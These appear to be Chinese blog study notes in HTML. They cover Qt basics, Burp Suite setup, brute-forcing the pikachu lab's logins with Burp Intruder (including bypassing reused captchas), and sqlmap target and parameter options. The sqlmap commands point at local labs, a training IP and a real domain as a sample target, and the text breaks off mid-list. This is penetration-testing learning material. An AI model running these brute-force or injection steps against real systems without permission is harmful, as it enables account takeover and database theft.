&lt;h2&gt;&lt;span id=&#34;浏览器配置&#34;&gt; 浏览器配置&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;为浏览器设置 127.0.0.1 端口 8080&lt;/p&gt;
&lt;h2&gt;&lt;span id=&#34;应用场景&#34;&gt; 应用场景&lt;/span&gt;&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;HTTP 服务端接口测试&lt;/li&gt;
&lt;li&gt;HTTP 客户端和 HTTP 服务端通信测试&lt;/li&gt;
&lt;li&gt;Cookie 统计分析&lt;/li&gt;
&lt;li&gt;HTTP 服务器 Web 安全扫描&lt;/li&gt;
&lt;li&gt;Web 页面爬取&lt;/li&gt;
&lt;li&gt;Web 常用编码和解码&lt;/li&gt;
&lt;li&gt;字符串随机性简单分析&lt;/li&gt;
&lt;li&gt;文化差异对比分析&lt;/li&gt;
&lt;/ol&gt;

 &lt;h2&gt;&lt;span id=&#34;什么是-qt&#34;&gt; 什么是 qt&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Qt（官方发音 [kju:t]，音同 cute）是一个跨平台的 C++ 开发库，主要用来开发图形用户界面（Graphical User Interface，GUI）程序，当然也可以开发不带界面的命令行（Command User Interface，CUI）程序。&lt;/li&gt;
&lt;li&gt;Qt 是纯 C++ 开发的，所以学好 C++ 非常有必要&lt;/li&gt;
&lt;li&gt;Qt 还存在 Python、Ruby、Perl 等脚本语言的绑定， 也就是说可以使用脚本语言开发基于 Qt 的程序。&lt;/li&gt;
&lt;li&gt;Qt 支持的操作系统有很多，例如通用操作系统 Windows、Linux、Unix，智能手机系统 Android、iOS、WinPhone， 嵌入式系统 QNX、VxWorks 等等&lt;/li&gt;
&lt;/ul&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;  
&lt;h2&gt;&lt;span id=&#34;qt-发展史&#34;&gt; qt 发展史&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Qt 由奇趣科技公司（Trolltech）的两位创始人于 1990 年着手开发，1995 年发布 Qt  1.0。&lt;/li&gt;
&lt;li&gt;2008 年，奇趣科技被诺基亚公司收购，Qt 也因此成为诺基亚旗下的编程语言工具。&lt;/li&gt;
&lt;li&gt;在智能手机的冲击下诺基亚大厦轰然倒塌，2012 年将 Qt 转让给 Digia 公司。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;span id=&#34;qt-应用程序框架英文路径&#34;&gt; qt 应用程序框架（&lt;strong&gt;英文路径！！！&lt;/strong&gt;)&lt;/span&gt;&lt;/h2&gt;
&lt;h3&gt;&lt;span id=&#34;项目-application&#34;&gt; 项目 (Application)&lt;/span&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Qt Widgets Application，支持桌面平台的有图形用户界面（Graphic User Interface，GUI） 界面的应用程序。GUI 的设计完全基于 C++ 语言，采用 Qt 提供的一套 C++ 类库。&lt;/li&gt;
&lt;li&gt;Qt Console Application，控制台应用程序，无 GUI 界面，一般用于学习 C/C++ 语言，只需要简单的输入输出操作时可创建此类项目。&lt;/li&gt;
&lt;li&gt;Qt Quick Application，创建可部署的 Qt Quick 2 应用程序。Qt Quick 是 Qt 支持的一套 GUI 开发架构，其界面设计采用 QML 语言，程序架构采用 C++ 语言。利用 Qt Quick 可以设计非常炫的用户界面，一般用于移动设备或嵌入式设备上无边框的应用程序的设计。&lt;/li&gt;
&lt;li&gt;Qt Quick Controls 2 Application，创建基于 Qt Quick Controls 2 组件的可部署的 Qt Quick 2 应用程序。Qt Quick Controls 2 组件只有 Qt 5.7 及以后版本才有。&lt;/li&gt;
&lt;li&gt;Qt Canvas 3D Application，创建 Qt Canvas 3D QML 项目，也是基于 QML 语言的界面设计，支持 3D 画布。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;span id=&#34;类信息-details&#34;&gt; 类信息 (Details)&lt;/span&gt;&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;基类 (父类)&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;QMainWindow 是主窗口类，主窗口具有主菜单栏、工具栏和状态栏，类似于一般的应用程序的主窗口&lt;/li&gt;
&lt;li&gt;QWidget 是所有具有可视界面类的基类，选择 QWidget 创建的界面对各种界面组件都可以 支持&lt;/li&gt;
&lt;li&gt;QDialog 是对话框类，可建立一个基于对话框的界面&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;span id=&#34;编译运行&#34;&gt; 编译运行&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;/2022/07/18/learning%20share/QT/image%5C6.png&#34; alt&gt;&lt;/p&gt;
&lt;h3&gt;&lt;span id=&#34;qapplication-应用程序类&#34;&gt; QApplication 应用程序类&lt;/span&gt;&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;QT 头文件没有.h，头文件和类名一样&lt;/li&gt;
&lt;li&gt;有且只有一个应用程序类的对象&lt;br&gt;
 QApplication (argc,argv)&lt;/li&gt;
&lt;li&gt;QWidget 是一个窗口基类，所有继承它的类也可以理解为窗口类，窗口创建好后默认隐藏，显示出来需要人为调用 show () 函数&lt;/li&gt;
&lt;li&gt;a.exec ()；让程序一直执行 (while), 等待用户操作&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;&lt;span id=&#34;pro-项目&#34;&gt; pro 项目&lt;/span&gt;&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;注释： #&lt;/li&gt;
&lt;li&gt;模块？？？&lt;/li&gt;
&lt;li&gt;高于 qt4 版本，为了兼容 qt4&lt;br&gt;
greaterThan(QT_MAJOR_VERSION, 4): QT += widgets&lt;/li&gt;
&lt;li&gt;应用程序的名字&lt;br&gt;
 TARGET = 01_test&lt;/li&gt;
&lt;li&gt;指定 makefile 的类型&lt;br&gt;
 TEMPLATE = app&lt;/li&gt;
&lt;li&gt;源文件 .cpp&lt;br&gt;
SOURCES += main.cpp&lt;br&gt;
widget.cpp&lt;/li&gt;
&lt;li&gt;头文件 .h&lt;br&gt;
HEADERS  += widget.h&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;&lt;span id=&#34;模块&#34;&gt; 模块&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;/2022/07/18/learning%20share/QT/image%5C7.png&#34; alt&gt;&lt;br&gt;
&lt;img src=&#34;/2022/07/18/learning%20share/QT/image%5C8.png&#34; alt&gt;&lt;/p&gt;
&lt;h3&gt;&lt;span id=&#34;指定父对象&#34;&gt; 指定父对象&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;比如我要在窗口中显示一个按钮&lt;br&gt;
如果不指定父对象，对象和对象之间没有关系，独立显示&lt;br&gt;
所以要指定对象&lt;br&gt;
如果 a 指定 b 为它的父对象，a 就在 b 上面&lt;br&gt;
指定父对象：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;setParent&lt;br&gt;
eg:  b.settParent(&amp;amp;a)&lt;/li&gt;
&lt;li&gt;通过构造函数传参&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;span id=&#34;信号和槽&#34;&gt; 信号和槽&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;信号和槽是 Qt 特有的消息传输机制，它能将相互独立的控件关联起来。&lt;br&gt;
在 Qt 中，用户和控件的每次交互过程称为一个事件&lt;br&gt;
 Qt 中的所有控件都具有接收信号的能力，一个控件还可以接收多个不同的信号&lt;br&gt;
在 Qt 中，对信号做出的响应动作就称为槽&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2022/07/18/learning%20share/QT/image%5C9.png&#34; alt&gt;&lt;br&gt;
QPushButton b1;&lt;br&gt;
 想要 b1 具有点击或者其他效果&lt;br&gt;
 connext (&amp;amp;b1,&amp;amp;QPushButton::pressed,this,&amp;amp;MainWidget::close)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&amp;amp;b1：信号发出者，指针类型&lt;/li&gt;
&lt;li&gt;&amp;amp;QPushButton::pressed：处理的信号，	&amp;amp; 发送者的名字：：信号名字&lt;/li&gt;
&lt;li&gt;this：信号接收者&lt;/li&gt;
&lt;li&gt;&amp;amp;MainWidget::close：槽函数，信号处理函数	&amp;amp; 接收的类名：：槽函数名字&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;span id=&#34;自定义槽&#34;&gt; 自定义槽&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;自定义槽：普通函数的用法&lt;br&gt;
 Qt5: 任意的成员函数，普通全局函数，静态函数&lt;br&gt;
槽函数需要和信号__一致__（参数，返回值）&lt;br&gt;
由于信号都是没有返回值，所以槽函数一定没有返回值&lt;/p&gt;
&lt;h3&gt;&lt;span id=&#34;自定义信号&#34;&gt; 自定义信号&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;信号必须有 signals 关键字来声明&lt;br&gt;
信号没有返回值，但可以有参数&lt;br&gt;
信号就是函数的声明，只需声明，无需定义&lt;br&gt;
使用：emit mySignal ();&lt;/p&gt;
&lt;h2&gt;&lt;span id=&#34;坐标系统&#34;&gt; 坐标系统&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;对于父窗口 (子窗口)，坐标系统相对于屏幕&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;原点：相对于屏幕左上角&lt;/li&gt;
&lt;li&gt;x：往右递增&lt;/li&gt;
&lt;li&gt;y：往下递增&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;

 &lt;h2&gt;&lt;span id=&#34;什么是暴力破解&#34;&gt; 什么是暴力破解&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;暴力破解通俗来说就是 “撞库”，是现在最流行的密码破解方式之一。它的实质就是枚举法，通过大量穷举的方式来尝试获取用户口令，即猜口令。并且暴力破解也不仅仅只用来暴力破解，也可以发现 Web 应用程序中的隐藏页面和内容。&lt;br&gt;
造成这样的漏洞的原因主要和不安全的口令设置和不可靠的数据传输组成，其中不安全的口令设置又可以分为使用弱口令和使用默认口令。&lt;br&gt;
大量猜测和穷举获取用户口令，通过对比数据包的长度可以很好的判断是否爆破成功&lt;/p&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;  
&lt;h2&gt;&lt;span id=&#34;burpsuite-四种攻击类型&#34;&gt; burpsuite 四种攻击类型&lt;/span&gt;&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;sniper (狙击手模式)&lt;br&gt;
 狙击手模式使用一组 payload 集合，它一次只使用一个 payload 位置，假设你标记了两个位置 “A” 和 “B”，payload 值为 “1” 和 “2”，那么它攻击会形成以下组合（除原始数据外）&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/10.png?raw=true&#34; alt&gt;&lt;/li&gt;
&lt;li&gt;battering ram (攻城锤模式)&lt;br&gt;
 攻城锤模式与狙击手模式类似的地方是，同样只使用一个 payload 集合，不同的地方在于每次攻击都是替换所有 payload 标记位置，而狙击手模式每次只能替换一个 payload 标记位置。&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/11.png?raw=true&#34; alt&gt;&lt;/li&gt;
&lt;li&gt;pitchfrk (音叉模式)&lt;br&gt;
 音叉模式允许使用多组 payload 组合，在每个标记位置上遍历所有 payload 组合，假设有两个位置 “A” 和 “B”，payload 组合 1 的值为 “1” 和 “2”，payload 组合 2 的值为 “3” 和 “4”&lt;br&gt;
![]&lt;a href=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/12.png?raw=true&#34;&gt;https://github.com/my011215/my011215.github.io/blob/main/image/12.png?raw=true&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;cluster bomb (集数炸弹模式)&lt;br&gt;
 集束炸弹模式跟草叉模式不同的地方在于，集束炸弹模式会对 payload 组进行笛卡尔积&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/13.png?raw=true&#34; alt&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;&lt;span id=&#34;pikachu-暴力破解&#34;&gt; pikachu 暴力破解&lt;/span&gt;&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;基于表单的暴力破解&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;使用 burpsuite 抓包进行撞库&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/14.png?raw=true&#34; alt&gt;&lt;/li&gt;
&lt;li&gt;右键进入 intruder 模块&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/15.png?raw=true&#34; alt&gt;&lt;/li&gt;
&lt;li&gt;按照如下步骤更改&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/16.png?raw=true&#34; alt&gt;&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/17.png?raw=true&#34; alt&gt;&lt;br&gt;
爆破资料：&lt;a href=&#34;https://github.com/rootphantomer/Blasting_dictionary&#34;&gt;https://github.com/rootphantomer/Blasting_dictionary&lt;/a&gt;&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/18.png?raw=true&#34; alt&gt;&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/19.png?raw=true&#34; alt&gt;&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/20.png?raw=true&#34; alt&gt;&lt;/li&gt;
&lt;li&gt;等待结果&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/21.png?raw=true&#34; alt&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;验证码绕过 (on server)&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;使用 burpsuite 抓包查看具体情况&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/22.png?raw=true&#34; alt&gt;&lt;/li&gt;
&lt;li&gt;右键进入 repeater 模块改变用户名和密码看看 (保持验证码不变)&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/23.png?raw=true&#34; alt&gt;&lt;br&gt;
 没改变，按照之前方案进行撞库&lt;/li&gt;
&lt;li&gt;验证码不改变可以爆破原因：&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/28.png?raw=true&#34; alt&gt;&lt;/li&gt;
&lt;li&gt;撞库&lt;br&gt;
！[]&lt;a href=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/24.png?raw=true&#34;&gt;https://github.com/my011215/my011215.github.io/blob/main/image/24.png?raw=true&lt;/a&gt;)&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/25.png?raw=true&#34; alt&gt;&lt;br&gt;
![]&lt;a href=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/26.png?raw=true&#34;&gt;https://github.com/my011215/my011215.github.io/blob/main/image/26.png?raw=true&lt;/a&gt;)&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/27.png?raw=true&#34; alt&gt;&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/29.png?raw=true&#34; alt&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;验证码绕过 (on client)&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;使用 burpsuite 抓包查看具体情况&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/30.png?raw=true&#34; alt&gt;&lt;/li&gt;
&lt;li&gt;右键进入 repeater 模块改变用户名和密码看看 (保持验证码不变)&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/31.png?raw=true&#34; alt&gt;&lt;br&gt;
 没改变，按照之前方案进行撞库&lt;/li&gt;
&lt;li&gt;验证码不改变可以爆破原因：&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/36.png?raw=true&#34; alt&gt;&lt;/li&gt;
&lt;li&gt;撞库&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/32.png?raw=true&#34; alt&gt;&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/33.png?raw=true&#34; alt&gt;&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/34.png?raw=true&#34; alt&gt;&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/35.png?raw=true&#34; alt&gt;&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/37.png?raw=true&#34; alt&gt;&lt;/li&gt;
&lt;li&gt;on client 和 on server&lt;br&gt;
on client:&lt;br&gt;
 验证码生成是由前端生成并且检查的，burpsuite 的数据传输在前端后面，不用经过前端验证码的检查&lt;br&gt;
 on server:&lt;br&gt;
 验证码放在后端，但是如果验证码没有时间限制和进行销毁就可以无限次使用&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;token 防爆破？&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;token&lt;br&gt;
（1）Token 的引入：Token 是在客户端频繁向服务端请求数据，服务端频繁的去数据库查询用户名和密码并进行对比，判断用户名和密码正确与否，并作出相应提示，在这样的背景下，Token 便应运而生。&lt;br&gt;
（2）Token 的定义：Token 是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个 Token 便将此 Token 返回给客户端，以后客户端只需带上这个 Token 前来请求数据即可，无需再次带上用户名和密码。&lt;br&gt;
（3）使用 Token 的目的：Token 的目的是为了减轻服务器的压力，减少频繁的查询数据库，使服务器更加健壮&lt;br&gt;
如果我们没有这个 token 值得话，无法去请求得到想要的数据。&lt;/li&gt;
&lt;li&gt;使用 burpsuite 抓包查看具体情况&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/38.png?raw=true&#34; alt&gt;&lt;/li&gt;
&lt;li&gt;撞库&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/39.png?raw=true&#34; alt&gt;&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/40.png?raw=true&#34; alt&gt;&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/41.png?raw=true&#34; alt&gt;&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/42.png?raw=true&#34; alt&gt;&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/43.png?raw=true&#34; alt&gt;&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/44.png?raw=true&#34; alt&gt;&lt;br&gt;
&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/45.png?raw=true&#34; alt&gt;&lt;/li&gt;
&lt;/ul&gt;

 &lt;h2&gt;&lt;span id=&#34;简介&#34;&gt; 简介&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;概念&lt;br&gt;
 SQLMap 是一个开源的渗透测试工具，可以用来进行自动化检测，利用 SQL 注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎，针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。&lt;/li&gt;
&lt;li&gt;支持数据库&lt;br&gt;
 Full support for MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase, SAP MaxDB, Informix, MariaDB, MemSQL, TiDB, CockroachDB, HSQLDB, H2, MonetDB, Apache Derby, Amazon Redshift, Vertica, Mckoi, Presto, Altibase, MimerSQL, CrateDB, Greenplum, Drizzle, Apache Ignite, Cubrid, InterSystems Cache, IRIS, eXtremeDB, FrontBase, Raima Database Manager, YugabyteDB and Virtuoso database management systems.&lt;/li&gt;
&lt;li&gt;sqlmap 支持五种不同的注入模式：&lt;br&gt;
1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。&lt;br&gt;
2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。&lt;br&gt;
3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。&lt;br&gt;
4、联合查询注入，可以使用 union 的情况下的注入。&lt;br&gt;
5、堆查询注入，可以同时执行多条语句的执行时的注入。&lt;/li&gt;
&lt;/ul&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;  
&lt;h2&gt;&lt;span id=&#34;sqlmap-支持功能&#34;&gt; sqlmap 支持功能&lt;/span&gt;&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;支持枚举用户、密码哈希、权限、角色、数据库、表和列。&lt;/li&gt;
&lt;li&gt;自动识别密码哈希格式，并支持使用基于字典的攻击破解它们。&lt;/li&gt;
&lt;li&gt;支持完全转储数据库表，根据用户的选择，一系列条目或特定列。用户还可以选择仅转储每列条目中的一系列字符。&lt;/li&gt;
&lt;li&gt;支持搜索特定数据库名称、所有数据库中的特定表或所有数据库表中的特定列。例如，这对于识别包含自定义应用程序凭据的表非常有用，其中相关列的名称包含 name 和 pass 等字符串。&lt;/li&gt;
&lt;li&gt;当数据库软件是 MySQL、PostgreSQL 或微软 SQL 服务器时，支持从数据库服务器底层文件系统下载和上载任何文件。&lt;/li&gt;
&lt;li&gt;当数据库软件是 MySQL、PostgreSQL 或微软 SQL 服务器时，支持在数据库服务器底层操作系统上执行任意命令并检索其标准输出。&lt;/li&gt;
&lt;li&gt;支持在攻击者计算机和底层操作系统的数据库服务器之间建立带外有状态 TCP 连接。此通道可以是交互式命令提示符、Meterpreter 会话或图形用户界面 （VNC） 会话，具体取决于用户的选择。&lt;/li&gt;
&lt;li&gt;支持通过元浏览器的米普雷特命令升级数据库进程的用户权限。getsystem&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;&lt;span id=&#34;安装&#34;&gt; 安装&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;详见链接：&lt;a href=&#34;https://blog.csdn.net/u013541325/article/details/109334272&#34;&gt;https://blog.csdn.net/u013541325/article/details/109334272&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;&lt;span id=&#34;相关命令了解&#34;&gt; 相关命令了解&lt;/span&gt;&lt;/h2&gt;
&lt;h3&gt;&lt;span id=&#34;基本参数&#34;&gt; 基本参数&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;–update: 更新&lt;br&gt;
 - h: 查看常用参数&lt;br&gt;
 - hh: 查看全部参数&lt;br&gt;
–version: 查看版本&lt;br&gt;
 - v: 查看执行过程信息，v0-v6&lt;br&gt;
-d ： mysql 表示数据库类型、user:password 表示目标服务器的账号和密码，@后表示要连接的服务器，3306 表示端口，zakq_dababasename 表示连接的数据库名称&lt;br&gt;
 python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -d “mysql://root:root@192.168.126.128:3386/zkaq_databasename”&lt;/p&gt;
&lt;h3&gt;&lt;span id=&#34;指定目标&#34;&gt; 指定目标&lt;/span&gt;&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;使用参数 -u 或 –url 指定一个 URL 作为目标，该参数后跟一个表示 URL 的字符串，还可以指定端口，如：&lt;br&gt;
&lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -u “&lt;a href=&#34;http://www.baidu.com/user.php?id=7&#34;&gt;www.baidu.com/user.php?id=7&lt;/a&gt;”&lt;br&gt;
&lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -url “&lt;a href=&#34;http://www.baidu.com:8080/user.php?id=7&#34;&gt;www.baidu.com:8080/user.php?id=7&lt;/a&gt;”&lt;/li&gt;
&lt;li&gt;-m “C:\Users\32083\Desktop\url.txt”&lt;br&gt;
url.txt 中存放需要扫描的网址&lt;/li&gt;
&lt;li&gt;python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -r “C:\Users\32083\Desktop\url.txt”&lt;br&gt;
 使用 Burp suite 抓包（post 提交！！！get 提交试过不行滴）将包内的信息拷贝到 url.txt 文件中&lt;/li&gt;
&lt;li&gt;-l log.txt —scope=” 正则表达式”   ？？？没太明白&lt;br&gt;
正则表达式：&lt;a href=&#34;https://www.runoob.com/regexp/regexp-syntax.html&#34;&gt;https://www.runoob.com/regexp/regexp-syntax.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;-c sqlmap.conf ：使用配置文件进行扫描 (&lt;a href=&#34;http://sqlmap.xn--confsqlmap-7j2p.py&#34;&gt;sqlmap.conf 与 sqlmap.py&lt;/a&gt; 在同一目录)？？？没太明白&lt;/li&gt;
&lt;li&gt;-u “URL” ： 对于这种写法，加&lt;em&gt;号扫描&lt;br&gt;
 python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -u “http://target_url/param1/value1&lt;/em&gt;/param2/value2“&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;&lt;span id=&#34;配置目标参数&#34;&gt; 配置目标参数&lt;/span&gt;&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;-p: 指定要扫描的参数（get 型）&lt;br&gt;
python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -u “&lt;a href=&#34;http://127.0.0.1/pikachu/vul/sqli/sqli_str.php?name=111&amp;amp;submit=%E6%9F%A5%E8%AF%A2%22-p%22name&#34;&gt;http://127.0.0.1/pikachu/vul/sqli/sqli_str.php?name=111&amp;amp;submit = 查询 &amp;quot;-p&amp;quot;name&lt;/a&gt;”&lt;/li&gt;
&lt;li&gt;-skip: 排除指定的扫描参数&lt;br&gt;
 python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -u “&lt;a href=&#34;http://127.0.0.1/pikachu/vul/sqli/sqli_str.php?name=111&amp;amp;submit=%E6%9F%A5%E8%AF%A2&#34;&gt;http://127.0.0.1/pikachu/vul/sqli/sqli_str.php?name=111&amp;amp;submit = 查询&lt;/a&gt;” -skip&amp;quot;submit&amp;quot;&lt;/li&gt;
&lt;li&gt;-data： 指定扫描的参数，get/post 都适用&lt;br&gt;
 python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -u “&lt;a href=&#34;http://127.0.0.1/pikachu/vul/sqli/sqli_str.php?name=111&amp;amp;submit=%E6%9F%A5%E8%AF%A2&#34;&gt;http://127.0.0.1/pikachu/vul/sqli/sqli_str.php?name=111&amp;amp;submit = 查询&lt;/a&gt;” -data&amp;quot;name&amp;quot;  (get)&lt;br&gt;
python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -u “&lt;a href=&#34;http://localhost/sqli-labs-master/Less-11/&#34;&gt;http://localhost/sqli-labs-master/Less-11/&lt;/a&gt;” --data “uname=1&amp;amp;passwd=1&amp;amp;submit=Submit”  (post)&lt;/li&gt;
&lt;li&gt;–param-del：改变分隔符，默认是 &amp;amp;，因为有些网站不实用 &amp;amp; 传递多个数据。&lt;br&gt;
python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -u “&lt;a href=&#34;http://59.63.200.79:8003/?id=1&amp;amp;username=admin&amp;amp;password=123%E2%80%9C&#34;&gt;http://59.63.200.79:8003/?id=1&amp;amp;username=admin&amp;amp;password=123“&lt;/a&gt; —date=”username=admin;password=123” —param-del=”;”&lt;/li&gt;
&lt;li&gt;-cookie ：使用 cookie 的身份认证&lt;br&gt;
 python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -u “&lt;a href=&#34;http://59.63.200.79:8003/?id=1%E2%80%9C&#34;&gt;http://59.63.200.79:8003/?id=1“&lt;/a&gt; -cookie=”security=low;PHPSESSID=121123131”&lt;/li&gt;
&lt;li&gt;-drop-set-cookie： 有时候发起请求后，服务器端会重新 Set-cookie 给客户端，SQLmap 默认会使用新的 cookie，这时候可以设置此参数，表示还是用原来的 cookie。&lt;br&gt;
python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -u “&lt;a href=&#34;http://59.63.200.79:8003/?id=1%E2%80%9C&#34;&gt;http://59.63.200.79:8003/?id=1“&lt;/a&gt; -cookie=”security=low;PHPSESSID=121123131 —-drop-set-cookie”&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;&lt;span id=&#34;配置目标行为&#34;&gt; 配置目标行为&lt;/span&gt;&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;—time-sec： 基于时间的注入检测相应延迟时间，默认 5 秒&lt;br&gt;
 python &lt;a href=&#34;http://sqlmap.py&#34;&gt;sqlmap.py&lt;/a&gt; -u “&lt;a href=&#34;http://59.63.200.79:8003/?id=1%E2%80%9C&#34;&gt;http://59.63.200.79:8003/?id=1“&lt;/a&gt; —time-sec=”3”&lt;/li&gt;
&lt;li&gt;-union-cols：默认联合查询 1-10 列，随 —level 增加，最多支持 100 列。&lt;br&gt;
